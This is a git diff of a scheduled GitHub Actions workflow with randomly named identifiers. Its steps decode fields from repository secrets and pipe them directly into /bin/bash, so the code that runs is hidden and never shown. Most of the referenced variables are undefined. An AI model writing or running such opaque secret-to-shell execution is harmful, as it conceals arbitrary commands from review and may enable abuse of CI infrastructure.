@@ -1,9 +1,9 @@
 name: huanglongxing1987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
+    - cron: '0 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: huanglongxing1987
         env:
-          zex662: ${{ secrets.zex662 }}
+          gi4: ${{ secrets.gi4 }}
         run: |
-          echo $zex662 | jq -r .i413 | /bin/bash
-          echo $y48061 | jq -r .vk9 | /bin/bash
-          echo $om9 | jq -r .cqles810 | /bin/bash
-          echo $oitnv27228 | jq -r .tbbm67 | /bin/bash
-          echo $ivr92364 | jq -r .spbz34032 | /bin/bash
-          echo $nzs15 | jq -r .kc059 | /bin/bash
-          echo $bnq39 | jq -r .wifkr51 | /bin/bash
-          echo $hcs3766 | jq -r .mb4 | /bin/bash
+          echo $gi4 | jq -r .fhpfg851 | /bin/bash
+          echo $ag036 | jq -r .bi93 | /bin/bash
+          echo $u8747 | jq -r .ex24022 | /bin/bash
+          echo $soclu04 | jq -r .pzga419 | /bin/bash
+          echo $zlzsz12575 | jq -r .m08 | /bin/bash
 
